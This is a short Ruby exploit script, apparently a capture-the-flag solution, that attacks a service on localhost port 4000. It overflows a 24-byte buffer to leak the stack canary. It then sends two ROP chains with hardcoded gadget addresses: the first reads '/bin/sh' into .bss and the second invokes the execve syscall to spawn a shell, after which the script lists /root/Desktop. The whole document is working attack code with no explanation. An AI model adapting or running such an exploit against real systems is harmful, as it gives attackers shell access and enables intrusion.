require 'pwn';
z=Sock.new '127.0.0.1',4000; 
z.sendline "a"*24;
context.log_level = :debug;
p=z.recvuntil "\n";
#printf("%0x",p)
p=z.recv 7;
pp=p;
#puts pp;
pp="\x00"+pp;
puts pp;
puts pp.ljust(8,"\x00");
canary=p64(u64(pp));
puts p64(u64(pp));
ovv="exit\n".ljust(24,'a');
ov=ovv+canary+'a'*8;
rdi_ret=p64(0x04005d5);
rsi_ret=p64(0x4017f7);
rdx_ret=p64(0x443776);
bss=0x06CF480;
read=p64(0x440300);
land=p64(0x400AEE);
write=p64(0x440360);
open_fun=p64(0x4402a0);
rop1=rdi_ret+p64(0)+rsi_ret+p64(bss)+rdx_ret+p64(0x40)+read+land;
pay1=ov+rop1;
shme="/bin/sh\x00".ljust(0x20,"\x00")+p64(bss)+"\x00"*0x10;
rax_rdx_rbx=p64(0x00000047a6e6);
syscallme=p64(0x000004003fc);
ropme=rax_rdx_rbx+p64(59)+p64(0)+p64(0)+rdi_ret+p64(bss)+rsi_ret+p64(bss+0x20)+syscallme;
pay2=ov+ropme;
print 'sending ... pay1';
z.sendline(pay1);
sleep 1;
print 'sending ....shme';
z.sendline(shme);
sleep 1;
z.sendline(pay2);
#z.interact;
z.recvuntil "\n";
#z.interact;
z.sendline "ls /root/Desktop/";
pstr = z.recv 40;
print pstr;
